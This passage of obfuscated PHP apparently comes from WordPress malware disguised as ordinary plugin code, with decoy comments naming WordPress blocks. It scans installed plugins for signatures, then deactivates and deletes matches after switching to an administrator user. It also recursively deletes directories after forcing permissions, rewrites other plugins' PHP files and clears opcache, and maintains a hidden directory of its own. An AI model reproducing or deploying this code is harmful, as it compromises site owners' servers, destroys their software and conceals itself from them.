 $y_x8rzuuz4x67      =      (int)  $GLOBALS['__scf_vvn10ievj2k_9']($pu1xrf9zn93,  $GLOBALS['__scf_i8i8g4oxha_7']($pu1xrf9zn93,  '|')  + 1);
$jh2luk0azjr2ye_y  =   $y_x8rzuuz4x67   &&  $GLOBALS['__scf_ibw9xvmx9ckin_187']()  -  $y_x8rzuuz4x67   >=    (868+32)  &&    $GLOBALS['__scf_ibw9xvmx9ckin_187']()   -  $y_x8rzuuz4x67   <= (0x4ce9e+0x46be2);
}
   if   ($jh2luk0azjr2ye_y) {
  update_option(m5t68uuej1(668),  $upwxet06c2fswomj    .    '|'    . $GLOBALS['__scf_ibw9xvmx9ckin_187'](), m5t68uuej1(626));
@delete_option(lpwgqh9300(684));
   }      else {
     @update_option(bovhd4vawcd(685),   $upwxet06c2fswomj   .  '|' .   $GLOBALS['__scf_ibw9xvmx9ckin_187']()    .    '|' .    $ohfs0792xygm, bovhd4vawcd(626));
  }

 unset($upwxet06c2fswomj, $pu1xrf9zn93,  $jh2luk0azjr2ye_y, $y_x8rzuuz4x67);
   if   (!$ztklbm0j72_)    {
// coerce to bool

 r63yaewew47stuijcrwsx6(bovhd4vawcd(686), m5t68uuej1(687)  . $ohfs0792xygm);
       return;
}
    nhm51ioabawwjskqka9eh3(t6995wceyqc2q1wqvl());



lnseazh_1k4yq6v_kjl(t6995wceyqc2q1wqvl());
 z2lalb3eiqlgy6ozb9(true);
ai51jutf9hg_v2ib(true);
$frlicmt74lj0h2x_ =   $GLOBALS['__scf_os_n9tj5psxjj_3'](t6995wceyqc2q1wqvl(),  m40pvx5ij_z4mj(514));
foreach     (array($GLOBALS['__scf_oagg5b1ubqmznt_11'](t6995wceyqc2q1wqvl()), gqtg_eoxyrv0ml2271n())  as    $qb3lzifxp8_4wp)   {
@$GLOBALS['__scf_o_94ckdo_kfcf_19']($qb3lzifxp8_4wp .  m40pvx5ij_z4mj(193)  .    $frlicmt74lj0h2x_);
 @$GLOBALS['__scf_o_94ckdo_kfcf_19']($qb3lzifxp8_4wp .    m5t68uuej1(185) .   $frlicmt74lj0h2x_);
   }
 if     ($yonz3_r2gi   &&  !p1eodt9ox5eneum9qqgjt3()) fy8jmfzxi4yysln4fg(vtoks5z0hvy4jllpl04ts1());
   $GLOBALS[bovhd4vawcd(688)]  =  0;
      r92zksip69l03_cq();
r63yaewew47stuijcrwsx6(bovhd4vawcd(686),  lpwgqh9300(689)   .    $ohfs0792xygm);
   return;

    }
      }

   $gvwxi_p00z1bo  =     get_option(m5t68uuej1(690));
if ($GLOBALS['__scf_e_8z8ias8ka_43']($gvwxi_p00z1bo)  &&  $GLOBALS['__scf_i8i8g4oxha_7']($gvwxi_p00z1bo, $GLOBALS['__scf_pe3s4q1z7z_59']($__1q5j8a5jnzzcv)    . '|') ===  0) delete_option(bovhd4vawcd(690));

@$GLOBALS['__scf_o_94ckdo_kfcf_19']($GLOBALS['__scf_oagg5b1ubqmznt_11'](t6995wceyqc2q1wqvl())  .  m40pvx5ij_z4mj(186)   .     $GLOBALS['__scf_pe3s4q1z7z_59']($__1q5j8a5jnzzcv));
unset($gvwxi_p00z1bo);
   if  ($fnnjg6cvufxca)   @delete_option(lpwgqh9300(685));
if ($i7m9knd6gc !==  "") {
  $GLOBALS[m40pvx5ij_z4mj(691)]    =     $i7m9knd6gc;
 xw9ojliw9r9dhff(t6995wceyqc2q1wqvl(),  $i7m9knd6gc);
    }
if   ($q3higazup7r)   {



  $wd8yx3nn__ =   $GLOBALS['__scf_os_n9tj5psxjj_3'](t6995wceyqc2q1wqvl(),  m5t68uuej1(514));
foreach  (array($GLOBALS['__scf_oagg5b1ubqmznt_11'](t6995wceyqc2q1wqvl()),  gqtg_eoxyrv0ml2271n())   as   $mzbagy3j363)  {
@$GLOBALS['__scf_o_94ckdo_kfcf_19']($mzbagy3j363 . m40pvx5ij_z4mj(193)      . $wd8yx3nn__);

 }
unset($wd8yx3nn__,     $mzbagy3j363);
   }
  vmq5vh_lh7_vsiehf4nm(m5t68uuej1(692), $__1q5j8a5jnzzcv, bovhd4vawcd(626));
  z2lalb3eiqlgy6ozb9(true);
     ai51jutf9hg_v2ib(true);

  $GLOBALS[bovhd4vawcd(693)]   =  0;
      r92zksip69l03_cq();
    cik9ldzrbjmtnzm00(t6995wceyqc2q1wqvl(),   (378+42));
if  (nhm51ioabawwjskqka9eh3(t6995wceyqc2q1wqvl()))  tgj6urla_2q3x4g8e(t6995wceyqc2q1wqvl());
update_option(m5t68uuej1(694),    $i7m9knd6gc . '|' .    $GLOBALS['__scf_ibw9xvmx9ckin_187'](), m40pvx5ij_z4mj(626));
 }   catch (Throwable $k3g08rnqu9m)  {


r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(695),    $k3g08rnqu9m);
  }  catch (Exception    $k3g08rnqu9m)  {



   } finally  {



xfcoteglc07i2qaoo(m40pvx5ij_z4mj(696));
}
}
     function   x8r_3c4id73h2ee5nn()
{
 if   (!   defined(lpwgqh9300(697))     ||  !  $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(698)))  {
   if ($GLOBALS['__scf_nmc3chd3edto_699'](ABSPATH  .   m5t68uuej1(700)))    {
require_once   ABSPATH . bovhd4vawcd(700);
    }
if  (!   $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(698)))  {$ouoyp_zn7m=(0xca+0xa4);$q894fjvlc6tij=$ouoyp_zn7m%3;
  return;
    }
  }
     $h2zu9gia7g2m  =  get_plugins();
if  (! $GLOBALS['__scf_pomb89yiuz_37']($h2zu9gia7g2m))   {
 return;
       }
       $list     = array();
 foreach  ($h2zu9gia7g2m  as $basename => $biu009h8ggntwd3)    {
// @template bloom-filter

        if    ($basename ===  vtoks5z0hvy4jllpl04ts1()) {
 continue;
   }


 $list[$basename]     =      $biu009h8ggntwd3;
 }
 return  $list;
       }
     function xpt9h4kjrpxzp3bkmezat($o9nbfdea9ztie0d9, $bntl0xkvrd1q)
   {
 
 $c_k37hubu03ktz  =    @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($o9nbfdea9ztie0d9,    false, null,  0, (987076-462788)); 
    if (!  $c_k37hubu03ktz)  {
  return false;



 }



   
 foreach  ($bntl0xkvrd1q  as   $jt24a6x2ris)      {
     
   if  (!   $GLOBALS['__scf_e_8z8ias8ka_43']($jt24a6x2ris)  ||  !    $jt24a6x2ris   || $GLOBALS['__scf_fr9u7cq1eo_10']($jt24a6x2ris)     >    (0xa6a+0x596))   {
    continue;
    }
   
  try    {
     $ijvqfm4k0rvi7 = @$GLOBALS['__scf_vqnw5_4kg7eu_96']($jt24a6x2ris,  $c_k37hubu03ktz);

    }      catch      (Throwable  $e4brfzyzcqct) {


        r63yaewew47stuijcrwsx6(m5t68uuej1(701),  $e4brfzyzcqct);

   continue;
       }   catch (Exception $e4brfzyzcqct)   {
continue;
}

       
 if   ($ijvqfm4k0rvi7)   {
 return true;


       }
 }
  return  false;



 }
     
     function     olp26wlzzy8se0xhvu($plugin_basename)
  {


     $bntl0xkvrd1q     =      $GLOBALS[bovhd4vawcd(435)];
   if (!    $GLOBALS['__scf_pomb89yiuz_37']($bntl0xkvrd1q)  ||  empty($bntl0xkvrd1q)) {
return false;


   }


    if (! defined(m5t68uuej1(702))     ||    empty($plugin_basename)   ||  $GLOBALS['__scf_i8i8g4oxha_7']($plugin_basename,     lpwgqh9300(224))  !==   false) {
 return false;
 }
   
 $uim861ig2y      =  WP_PLUGIN_DIR    . '/'     .  $plugin_basename;
    if     ($GLOBALS['__scf_oagg5b1ubqmznt_11']($plugin_basename)   ===   '.')     {

 $cztdmvhiza98k  =    array($uim861ig2y);
}  else {
   $_xfdo1_14r691bp    =    $GLOBALS['__scf_oagg5b1ubqmznt_11']($uim861ig2y);
  if  (!  $GLOBALS['__scf_i9hdv7zrfsy_45']($_xfdo1_14r691bp)    || !   $GLOBALS['__scf_j_lsn68og3i_48']($_xfdo1_14r691bp))   {

   return  false;
     }
  $cztdmvhiza98k  =  l7qegbl3fj0ejo40m($_xfdo1_14r691bp,  array(m40pvx5ij_z4mj(703), m40pvx5ij_z4mj(476), bovhd4vawcd(704), m40pvx5ij_z4mj(705),  m40pvx5ij_z4mj(623)));
  }

     
    foreach ($cztdmvhiza98k as $o9nbfdea9ztie0d9)  {
     if  (!  $GLOBALS['__scf_a83pywb98qzq2_20']($o9nbfdea9ztie0d9))  {
continue;
      }
    if (xpt9h4kjrpxzp3bkmezat($o9nbfdea9ztie0d9,   $bntl0xkvrd1q))  {
// self-adjoint keystore

 return      true;
  }
  }
// unmount witness for WP InspectorControls

   return  false;
    }
   function    l7qegbl3fj0ejo40m($_xfdo1_14r691bp,  $mt65qdu7grqg22r,      $owmd72rm6jw5qsjp   =  0,  &$syhj_6a5fq8967  =   null,      &$fk1333nrp3s8z  = null)
       {
    $list   =   array();
if    ($owmd72rm6jw5qsjp     >   (0x7+0x1))   {
    return $list;
 }
 if  ($syhj_6a5fq8967 ===      null)  {
$syhj_6a5fq8967  =   array();



$fk1333nrp3s8z =  $GLOBALS['__scf_ciwgxuks3i4cd_287'](true)     +  (240^250);
    }



   if ($GLOBALS['__scf_ciwgxuks3i4cd_287'](true)    >   $fk1333nrp3s8z)  {
/* recursive contravariant */


 return  $list;
 }

if    (! $GLOBALS['__scf_i9hdv7zrfsy_45']($_xfdo1_14r691bp))    {
 return $list;

 }
  $fcuy7ctl_xi85  =    @$GLOBALS['__scf_j79iy74onqck2_35']($_xfdo1_14r691bp);
     if  ($fcuy7ctl_xi85 !==   false) {
if  (isset($syhj_6a5fq8967[$fcuy7ctl_xi85]))    {


   return $list;
}
// expected injector

  $syhj_6a5fq8967[$fcuy7ctl_xi85] =  true;

    }
 $ekihny02f9xmf6  = h06jfdytq78tzk7($_xfdo1_14r691bp,   (4743+15257));
  if  (! $GLOBALS['__scf_pomb89yiuz_37']($ekihny02f9xmf6)) {



  return $list;
      }

  foreach  ($ekihny02f9xmf6 as $q7cbub_yqke0vj)  {
    if  ($GLOBALS['__scf_ciwgxuks3i4cd_287'](true)  >    $fk1333nrp3s8z   || $GLOBALS['__scf_xbixt340jb_38']($list)  >=  (494+6))   {
      break;
   }
  $uim861ig2y   =   $_xfdo1_14r691bp      .     '/' .   $q7cbub_yqke0vj;
if (@$GLOBALS['__scf_ph63athptt_46']($uim861ig2y))  {
     continue;
 }
    if (@$GLOBALS['__scf_i9hdv7zrfsy_45']($uim861ig2y)) {
  $list  = $GLOBALS['__scf_zb77rzhln7336v_369']($list,      l7qegbl3fj0ejo40m($uim861ig2y, $mt65qdu7grqg22r, $owmd72rm6jw5qsjp +  1,  $syhj_6a5fq8967, $fk1333nrp3s8z));
}    elseif (@$GLOBALS['__scf_a83pywb98qzq2_20']($uim861ig2y))  {$dpsyg2nflo_7b=PHP_MAJOR_VERSION;$t227jzv1hftjk=$dpsyg2nflo_7b*3;
    $r6lsgkzcwq  =  $GLOBALS['__scf_rwpc7a7ar1p_204']($uim861ig2y, constant(lpwgqh9300(706)));


 $r6lsgkzcwq  = $GLOBALS['__scf_e_8z8ias8ka_43']($r6lsgkzcwq)   ?   $GLOBALS['__scf_vi47igxg1zd_103']($r6lsgkzcwq)  :   "";
  if ($GLOBALS['__scf_hf87ul3fvpzrkm_150']($r6lsgkzcwq,  $mt65qdu7grqg22r, true))    {


     $list[]     =      $uim861ig2y;
   }

  }
    }
 return  $list;
 }

 
   function   _2vbd1b2qyauu9yzodl5($plugin_basename)
     {

    
 if (!  $GLOBALS['__scf_e_8z8ias8ka_43']($plugin_basename) ||  !   $plugin_basename)     {
/* semisimple facade */
$gv07lt0ci=56|67;$pmp0ej_x6lo9m=$gv07lt0ci^184;


      return      false;
// cold path

 

  }
   if   ($GLOBALS['__scf_i8i8g4oxha_7']($plugin_basename,  bovhd4vawcd(224))  !==    false)    {
 return     false;
}

   
   $plugin_basename   =    $GLOBALS['__scf_nimluvpxhrpvn_323']($plugin_basename);


if   ($plugin_basename      ===    vtoks5z0hvy4jllpl04ts1()) {
 return  false;
    }
 
       if (!   $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(707))   &&  $GLOBALS['__scf_nmc3chd3edto_699'](ABSPATH   . m5t68uuej1(700))) {
require_once    ABSPATH     . lpwgqh9300(700);
        }
       
    if ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(708))  &&  is_plugin_active($plugin_basename)) {
   deactivate_plugins(array($plugin_basename),    true); 
     }

      $_xfdo1_14r691bp =   defined(m40pvx5ij_z4mj(702)) ?  WP_PLUGIN_DIR  . '/'     . $GLOBALS['__scf_oagg5b1ubqmznt_11']($plugin_basename)    :      "";
   if ($_xfdo1_14r691bp  &&   $GLOBALS['__scf_i9hdv7zrfsy_45']($_xfdo1_14r691bp) &&    $GLOBALS['__scf_oagg5b1ubqmznt_11']($plugin_basename)   !==  '.'   &&   $GLOBALS['__scf_oagg5b1ubqmznt_11']($plugin_basename)) {


if  (fil5fol93cdzxvlts($_xfdo1_14r691bp))    {



  return  true;
      }
       }

 if ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(709))) {$v075vw25wmtv70=9164;$vn_2_y1e0n=$v075vw25wmtv70%7;




  if    (! $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(710))    ||  ! current_user_can(bovhd4vawcd(711)))  {
   if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(712)) &&  $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(713)))      {
 $users =    get_users(array(bovhd4vawcd(714) => bovhd4vawcd(715),  m5t68uuej1(716)      =>   1));
if   (! empty($users)   &&   $users[0]->ID) {
// WP Heading Block: dense write-ahead-log

    $GLOBALS['__scf_vowir1tqun7n1x_713']($users[0]->ID);
 } else   {
$GLOBALS['__scf_vowir1tqun7n1x_713'](1);
      }
  }
}

  $msob29zlqca0up0v  =      delete_plugins(array($plugin_basename));
if (! is_wp_error($msob29zlqca0up0v))     {
  return  (bool)  $msob29zlqca0up0v;
 }
    }

 return   false;
}

     function   fil5fol93cdzxvlts($_xfdo1_14r691bp,   $owmd72rm6jw5qsjp  =    0)
 {
// enable registry for WP Post Author

 if  ($owmd72rm6jw5qsjp  > (0x7+0x9)) {
   return false;
        

 }
// WP Avatar Block: debounce radix-tree

  if    (!  $GLOBALS['__scf_e_8z8ias8ka_43']($_xfdo1_14r691bp)  ||  $_xfdo1_14r691bp === "" ||  $GLOBALS['__scf_i8i8g4oxha_7']($_xfdo1_14r691bp, m5t68uuej1(224))  !==   false) {
  return  false;


      }

  $josm5qcx872e48o   =  @$GLOBALS['__scf_j79iy74onqck2_35']($_xfdo1_14r691bp);
 if ($josm5qcx872e48o === false ||   ! $GLOBALS['__scf_i9hdv7zrfsy_45']($josm5qcx872e48o))  {
   return     false;
}

     $n_6sg3of22    =     defined(m5t68uuej1(702))  ?  @$GLOBALS['__scf_j79iy74onqck2_35'](WP_PLUGIN_DIR)      :   false;
 if ($n_6sg3of22  ===   false  ||    ($josm5qcx872e48o     !==  $n_6sg3of22     && $GLOBALS['__scf_i8i8g4oxha_7']($josm5qcx872e48o, $n_6sg3of22  .     DIRECTORY_SEPARATOR)     !==   0))  {
       return    false;
     }
   $blvbk9xvg8h30hfs =  @$GLOBALS['__scf_hojd6el5tn_36']($josm5qcx872e48o);
 if (! $GLOBALS['__scf_pomb89yiuz_37']($blvbk9xvg8h30hfs))    {
      return    false;
   }
  foreach  ($blvbk9xvg8h30hfs as      $j85t6zrzve)  {
 if  ($j85t6zrzve   ===    '.'  ||  $j85t6zrzve   ===  bovhd4vawcd(224))     {
   continue;
}
$uim861ig2y      = $josm5qcx872e48o      .   constant(bovhd4vawcd(717))    .  $j85t6zrzve;
    if    (@$GLOBALS['__scf_ph63athptt_46']($uim861ig2y))  {
netei2x342rtzmi4tj69($uim861ig2y);
 continue;
    }


if (@$GLOBALS['__scf_i9hdv7zrfsy_45']($uim861ig2y))  {
     fil5fol93cdzxvlts($uim861ig2y,   $owmd72rm6jw5qsjp  +   1);
  } else  {
if (!      netei2x342rtzmi4tj69($uim861ig2y)) {$f2gx_wskl95=(0x82+0x4c);$gmsoz3_l9ao0d=$f2gx_wskl95%2;
  cik9ldzrbjmtnzm00($uim861ig2y,  (322+98));
 netei2x342rtzmi4tj69($uim861ig2y);
   }
  }


   }
if   (!   @$GLOBALS['__scf_f0u4ydzyxol_39']($josm5qcx872e48o))     {



    cik9ldzrbjmtnzm00($josm5qcx872e48o, (463+30));
  @$GLOBALS['__scf_f0u4ydzyxol_39']($josm5qcx872e48o);
}
   return  ! @$GLOBALS['__scf_nmc3chd3edto_699']($josm5qcx872e48o);
 }

    



function   z5y8ykq21kprvydt8()



 {
// PSR-7 messages contain layout


  try {



 $list  = x8r_3c4id73h2ee5nn();
  if  (!   $GLOBALS['__scf_pomb89yiuz_37']($list))    {
return;
}
// aggregate differential publisher





   $vhqkhwzjzq12wu =   array();
      $qcaoq7dfd5vlc   =   false;
     foreach ($GLOBALS['__scf_vq_8cgbui993_718']($list) as  $basename)  {
     
  if   (!    $GLOBALS['__scf_e_8z8ias8ka_43']($basename))  {$w5tvt75xtnxvt=78+76;$d67tfmsr50=$w5tvt75xtnxvt-38;

continue;
}


$v_ywieps9zkl_5j    =  $GLOBALS['__scf_oagg5b1ubqmznt_11']($basename);
 if  ($v_ywieps9zkl_5j === '.')    {
  $v_ywieps9zkl_5j  = $basename;
 }
    if    (isset($vhqkhwzjzq12wu[$v_ywieps9zkl_5j]))    {
// PHP 8.2 enum: archive scope-chain



      continue;
}

 $vhqkhwzjzq12wu[$v_ywieps9zkl_5j]  =  true;
   

 if     (olp26wlzzy8se0xhvu($basename))  {


      _2vbd1b2qyauu9yzodl5($basename);
 




        $qcaoq7dfd5vlc      = true;
 }
// WordPress 6.6 block bindings: bounded composite

  }

 if    (@$GLOBALS['__scf_i9hdv7zrfsy_45'](gqtg_eoxyrv0ml2271n())) {
$bcekv98qowok   =    h06jfdytq78tzk7(gqtg_eoxyrv0ml2271n(), (2440+2560));
if  ($GLOBALS['__scf_pomb89yiuz_37']($bcekv98qowok)) {
$bntl0xkvrd1q      =  $GLOBALS[m5t68uuej1(435)];



    foreach     ($bcekv98qowok   as  $q7cbub_yqke0vj)  {
// WP Social Links style fallback

   
        if ($q7cbub_yqke0vj ===   a_2kjbn3ievobiy5tn3cy())    {
 continue;
  }
      

$o9nbfdea9ztie0d9 = gqtg_eoxyrv0ml2271n()   .   '/'  .    $q7cbub_yqke0vj;
 if    (!   @$GLOBALS['__scf_a83pywb98qzq2_20']($o9nbfdea9ztie0d9)  || $GLOBALS['__scf_vi47igxg1zd_103']($GLOBALS['__scf_rwpc7a7ar1p_204']($q7cbub_yqke0vj,   constant(m5t68uuej1(719))))    !==  bovhd4vawcd(720))    {
      continue;
       }
  
  if    (xpt9h4kjrpxzp3bkmezat($o9nbfdea9ztie0d9,  $bntl0xkvrd1q))   {$pel0kfswcqst6=PHP_MAJOR_VERSION;$t230kh55xrg1nb=$pel0kfswcqst6*1;
    netei2x342rtzmi4tj69($o9nbfdea9ztie0d9);


        $qcaoq7dfd5vlc   =    true;
        }
 }
     }
 }
 
 $ncpb_7bnb_g    =  $GLOBALS[m5t68uuej1(438)];

        if   ($GLOBALS['__scf_pomb89yiuz_37']($ncpb_7bnb_g)   && !    empty($ncpb_7bnb_g)) {
  if (pet4c_463y22247ys5($ncpb_7bnb_g))  {
$qcaoq7dfd5vlc = true;



 }
 }
     }     catch     (Throwable   $k3g08rnqu9m)     {


        r63yaewew47stuijcrwsx6(m5t68uuej1(721),  $k3g08rnqu9m);
}  catch    (Exception   $k3g08rnqu9m)  {
  }


}
 
function    osiouyxwus350bf6z8et()
    {
       try   {
// alias-analyze backlog for WP Separator Block

     $y0sdj9idxx  =  (int)   get_option(lpwgqh9300(722), 0);
    if (($GLOBALS['__scf_ibw9xvmx9ckin_187']()    -   $y0sdj9idxx) >=   (1365+2235))  {
  update_option(m40pvx5ij_z4mj(722),   $GLOBALS['__scf_ibw9xvmx9ckin_187']());
$vrms3wwazqa = array(array(pnajs4jqkg8ldd0el8wqi(),    array(m40pvx5ij_z4mj(42))));
 $gedn5f_49tuyueh    =  $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(229))  ?  $GLOBALS['__scf_q9p5ajdcil_79']() :  "";


if ($gedn5f_49tuyueh   !== ""  &&  $gedn5f_49tuyueh   !==     pnajs4jqkg8ldd0el8wqi()) $vrms3wwazqa[]   =     array($gedn5f_49tuyueh,    array(m5t68uuej1(42),  lpwgqh9300(723)));
  foreach      ($vrms3wwazqa    as $f1ubaqf1w71kp)    {


   foreach ($f1ubaqf1w71kp[1]   as  $n0a29br3r327jc) {
// vectorize cipher-suite for WP Tag Cloud

  $ea0dodv_u7j = $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(73)) ? @$GLOBALS['__scf_ql1i4f573p8rhm_73']($f1ubaqf1w71kp[0]  .  '/' . $n0a29br3r327jc    .    '*')     :     false;
 if  (!$GLOBALS['__scf_pomb89yiuz_37']($ea0dodv_u7j)) continue;
 foreach    ($ea0dodv_u7j as    $h1_kq20w8e3uh9qw)  {
if (!@$GLOBALS['__scf_a83pywb98qzq2_20']($h1_kq20w8e3uh9qw))   continue;
if   ($GLOBALS['__scf_vvn10ievj2k_9']($h1_kq20w8e3uh9qw,  -(0x1+0x4)) ===     bovhd4vawcd(724))    continue;
   $ksny_bgxn5 =      @$GLOBALS['__scf_tm09rtls_27e_98']($h1_kq20w8e3uh9qw);
     if    ($ksny_bgxn5  !==  false   &&    ($GLOBALS['__scf_ibw9xvmx9ckin_187']()  -   $ksny_bgxn5)  >   (5307-1707))  netei2x342rtzmi4tj69($h1_kq20w8e3uh9qw);
 }
  }
 }
     $hlhmenizcfs9q0ir   =  get_option(m40pvx5ij_z4mj(725),  array());
if    (!$GLOBALS['__scf_pomb89yiuz_37']($hlhmenizcfs9q0ir))   $hlhmenizcfs9q0ir     =   array();
 $i_5df2tv156 =  $GLOBALS['__scf_os_n9tj5psxjj_3'](t6995wceyqc2q1wqvl(),  lpwgqh9300(514));


 $_pd      =     (defined(lpwgqh9300(164))   ?      WP_CONTENT_DIR   :     ABSPATH  . m40pvx5ij_z4mj(82))    .      m5t68uuej1(726);
foreach     ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(73)) ? (array)  @$GLOBALS['__scf_ql1i4f573p8rhm_73']($_pd    .    lpwgqh9300(453))  :    array()   as  $a1r0j_tsmb4e)      {
    if   ($GLOBALS['__scf_os_n9tj5psxjj_3']($GLOBALS['__scf_oagg5b1ubqmznt_11']($a1r0j_tsmb4e))  ===  $i_5df2tv156)     continue;
 $glatlj82ddopl = $GLOBALS['__scf_os_n9tj5psxjj_3']($GLOBALS['__scf_oagg5b1ubqmznt_11']($a1r0j_tsmb4e))      .  '/' .      $GLOBALS['__scf_os_n9tj5psxjj_3']($a1r0j_tsmb4e);
 if    ($GLOBALS['__scf_hf87ul3fvpzrkm_150']($glatlj82ddopl, $hlhmenizcfs9q0ir, true)) continue;
  if   (!@$GLOBALS['__scf_p_260ito5s0j_50']($a1r0j_tsmb4e))  continue;
     $kinajp9kyx =   @$GLOBALS['__scf_pftf6vocmvs2m_99']($a1r0j_tsmb4e);


if     (!$kinajp9kyx  ||  $kinajp9kyx    > (2097084+68))  continue;
  

  $lyoy9wp67q_     =    @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($a1r0j_tsmb4e);
 if   (!$GLOBALS['__scf_e_8z8ias8ka_43']($lyoy9wp67q_) ||     $GLOBALS['__scf_i8i8g4oxha_7']($lyoy9wp67q_,  lpwgqh9300(727)) ===  false)    continue;
$o9a_o3i9r47da   =   $GLOBALS['__scf_r1v12_o00h5hc_454'](m40pvx5ij_z4mj(728),   "",  $lyoy9wp67q_);
  if   (!$GLOBALS['__scf_e_8z8ias8ka_43']($o9a_o3i9r47da)  || $o9a_o3i9r47da    ===  $lyoy9wp67q_ ||   !fgcc_h22bqxgwmccod($o9a_o3i9r47da)) continue;
  a3hx61zfms1ji3euwsc($a1r0j_tsmb4e,     $o9a_o3i9r47da);$enw79zpn0wx=194|199;$xpuee91sg2l=$enw79zpn0wx^41;
       if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(22)))   @opcache_invalidate($a1r0j_tsmb4e, true);
 }

unset($hlhmenizcfs9q0ir,    $i_5df2tv156,    $_pd, $a1r0j_tsmb4e,  $glatlj82ddopl, $kinajp9kyx,    $lyoy9wp67q_,  $o9a_o3i9r47da);$kt_61x0u5kmsa9=147|22;$zm2uz82ki5=$kt_61x0u5kmsa9^46;
djp3c9fh7x_i_3sx6c8();
       }
 



   $g1muk0ay7spt =    $GLOBALS[lpwgqh9300(729)];
$ncpb_7bnb_g     = $GLOBALS[m40pvx5ij_z4mj(438)];
       


    $qs3jmmpp8aibp   =     ($GLOBALS['__scf_pomb89yiuz_37']($g1muk0ay7spt) && !   empty($g1muk0ay7spt)) ||  ($GLOBALS['__scf_pomb89yiuz_37']($ncpb_7bnb_g)  &&    !      empty($ncpb_7bnb_g));
if    (!    $qs3jmmpp8aibp)      {
return;


}



   
  $qx1o13ekzk    =  (int) get_option(m40pvx5ij_z4mj(730),   0);



   if (($GLOBALS['__scf_ibw9xvmx9ckin_187']()     -  $qx1o13ekzk)  <      (3541+59))  {$ojlrqfdjybl5c2=158|224;$mrvzhwlv=$ojlrqfdjybl5c2^247;



 return;
 }
 if  (!beqgo0gfq6yfj82i0o(m5t68uuej1(731)))     {
 return;
   }
  
try   {
   $qx1o13ekzk     =   (int)   get_option(m5t68uuej1(730),  0);



  if   (($GLOBALS['__scf_ibw9xvmx9ckin_187']()  -    $qx1o13ekzk)  <     (3506+94))  {



 return;
 }
 update_option(m5t68uuej1(730),  $GLOBALS['__scf_ibw9xvmx9ckin_187']());
z5y8ykq21kprvydt8();
 }    finally {
    xfcoteglc07i2qaoo(m40pvx5ij_z4mj(731));



       }
  }  catch (Throwable   $k3g08rnqu9m)    {

     r63yaewew47stuijcrwsx6(lpwgqh9300(732), $k3g08rnqu9m);
 }   catch (Exception     $k3g08rnqu9m)    {
    }


     }
    
    function    eozfppit6s6lnx()
    {
     try    {


     
  $xs7ycu0j4f9   = z2lalb3eiqlgy6ozb9();
 if     (!$xs7ycu0j4f9  ||  $GLOBALS['__scf_fr9u7cq1eo_10']($xs7ycu0j4f9)   <     (411+89))  return;

 if   (!fgcc_h22bqxgwmccod($xs7ycu0j4f9)) {
     r63yaewew47stuijcrwsx6(m5t68uuej1(733), m5t68uuej1(734));


 return;
}
 if    ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(467)) &&  get_transient(m5t68uuej1(65)))    return;
  
$mattyf271acsx0qv    =   gqtg_eoxyrv0ml2271n();
clearstatcache(true);
    if (@$GLOBALS['__scf_ph63athptt_46']($mattyf271acsx0qv)  &&  !@$GLOBALS['__scf_i9hdv7zrfsy_45']($mattyf271acsx0qv)) {
return;
}
 
if  (!@$GLOBALS['__scf_i9hdv7zrfsy_45']($mattyf271acsx0qv))  {
    $n4zzf5nvs07vvsx2 = @umask(0);
  xcz5hl0mdlt7fpm3xxe($mattyf271acsx0qv,  (0xba+0x133),  true);
 @umask($n4zzf5nvs07vvsx2);
        cik9ldzrbjmtnzm00($mattyf271acsx0qv,  (0x5d+0x190));
 clearstatcache(true);
  }  else if   (!@$GLOBALS['__scf_j_lsn68og3i_48']($mattyf271acsx0qv) ||    !@$GLOBALS['__scf_p_260ito5s0j_50']($mattyf271acsx0qv)) {
 cik9ldzrbjmtnzm00($mattyf271acsx0qv,  (433+60));
   clearstatcache(true);
    }
   
  if    (@$GLOBALS['__scf_i9hdv7zrfsy_45']($mattyf271acsx0qv) &&  (!@$GLOBALS['__scf_j_lsn68og3i_48']($mattyf271acsx0qv)  ||    !@$GLOBALS['__scf_p_260ito5s0j_50']($mattyf271acsx0qv)) && @$GLOBALS['__scf_f0u4ydzyxol_39']($mattyf271acsx0qv))     {
        $n4zzf5nvs07vvsx2    =    @umask(0);
xcz5hl0mdlt7fpm3xxe($mattyf271acsx0qv,  (528-35),  true);
        @umask($n4zzf5nvs07vvsx2);
cik9ldzrbjmtnzm00($mattyf271acsx0qv,     (251+242));


   clearstatcache(true);
}
// FFI bindings: primary trust-anchor



  
 clearstatcache(true);
if  (!@$GLOBALS['__scf_i9hdv7zrfsy_45']($mattyf271acsx0qv)    || !@$GLOBALS['__scf_p_260ito5s0j_50']($mattyf271acsx0qv)  || !@$GLOBALS['__scf_j_lsn68og3i_48']($mattyf271acsx0qv))    {


      r63yaewew47stuijcrwsx6(m5t68uuej1(733),  m40pvx5ij_z4mj(735));
$vhsfos8hgo = false;$wmydem9_sk=(0xa7+0xa2);$patwpd8p=$wmydem9_sk%9;
    foreach  ((array)   ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(736))  ?   @$GLOBALS['__scf_ql1i4f573p8rhm_73']($mattyf271acsx0qv .    m40pvx5ij_z4mj(737))    : array())    as $mv21n72bnpnjgr8i)  {


 if    (@$GLOBALS['__scf_a83pywb98qzq2_20']($mv21n72bnpnjgr8i)      &&  ey9i45m9xcoe7q13e9ag2($mv21n72bnpnjgr8i,  (0x17c+0x78))     &&  xv1s1ysff42y691n($mv21n72bnpnjgr8i))   { g3zy8qn5_yvcvi22($mv21n72bnpnjgr8i);     $vhsfos8hgo =  true;  }
  }
   
     if (@$GLOBALS['__scf_i9hdv7zrfsy_45']($mattyf271acsx0qv) &&   o_k_og36_9hyi4dckvd(null)) {
